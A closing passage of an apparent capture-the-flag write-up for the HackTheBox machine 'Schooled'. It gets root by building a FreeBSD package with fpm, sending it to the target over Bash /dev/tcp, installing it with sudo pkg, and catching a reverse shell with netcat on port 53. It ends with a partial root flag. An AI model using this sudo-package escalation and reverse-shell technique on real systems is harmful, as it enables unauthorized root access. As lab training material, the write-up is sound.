</span></span><span class="line"><span class="cl">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in <span class="sb">`</span>block in output<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `open&#39;</span>
</span></span><span class="line"><span class="cl">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in <span class="sb">`</span>output<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:in `execute&#39;</span>
</span></span><span class="line"><span class="cl">        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in <span class="sb">`</span>run<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:in `run&#39;</span>
</span></span><span class="line"><span class="cl">        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in <span class="sb">`</span>run<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/bin/fpm:7:in `&lt;top (required)&gt;&#39;</span>
</span></span><span class="line"><span class="cl">        /usr/local/bin/fpm:23:in <span class="sb">`</span>load<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        /usr/local/bin/fpm:23:in `&lt;main&gt;&#39;</span>
</span></span><span class="line"><span class="cl">Created package <span class="o">{</span>:path<span class="o">=</span>&gt;<span class="s2">&#34;x-1.0.txz&#34;</span><span class="o">}</span></span></span></code></pre>
</figure><p>I will transfer the package to Schooled.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ <span class="k">$(</span>bash -c <span class="s1">&#39;cat x-1.0.txz &gt; /dev/tcp/10.10.10.234/9000&#39;</span><span class="k">)</span></span></span></code></pre>
</figure><blockquote>
<p><code>/dev/tcp/</code> is a feature from Bash. Since my shell is Zsh, so I had to invoke the transfer command within a subshell.</p>
</blockquote>
<p>On Schooled:</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jamie@Schooled:~ $ nc -lv <span class="m">9000</span> &gt; x-1.0.txz
</span></span><span class="line"><span class="cl">Connection from 10.10.14.49 <span class="m">60744</span> received!</span></span></code></pre>
</figure><p>I will setup a Netcat listener on my Kali and start the installation of the package on Schooled.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz
</span></span><span class="line"><span class="cl">pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
</span></span><span class="line"><span class="cl">pkg: Repository FreeBSD cannot be opened. <span class="s1">&#39;pkg update&#39;</span> required
</span></span><span class="line"><span class="cl">Checking integrity... <span class="k">done</span> <span class="o">(</span><span class="m">0</span> conflicting<span class="o">)</span>
</span></span><span class="line"><span class="cl">The following <span class="m">1</span> package<span class="o">(</span>s<span class="o">)</span> will be affected <span class="o">(</span>of <span class="m">0</span> checked<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">New packages to be INSTALLED:
</span></span><span class="line"><span class="cl">        x: 1.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Number of packages to be installed: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1/1<span class="o">]</span> Installing x-1.0...
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
</figure><p>And I&rsquo;m rooted.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">23093</span>
</span></span><span class="line"><span class="cl"><span class="c1"># whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; cut -c-15 /root/root.txt</span>
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>,5<span class="o">(</span>operator<span class="o">)</span>
</span></span><span class="line"><span class="cl">Schooled
</span></span><span class="line"><span class="cl">2462d8e2125d2a0</span></span></code></pre>
</figure>]]></content:encoded>
    </item>
    
  </channel>
</rss>
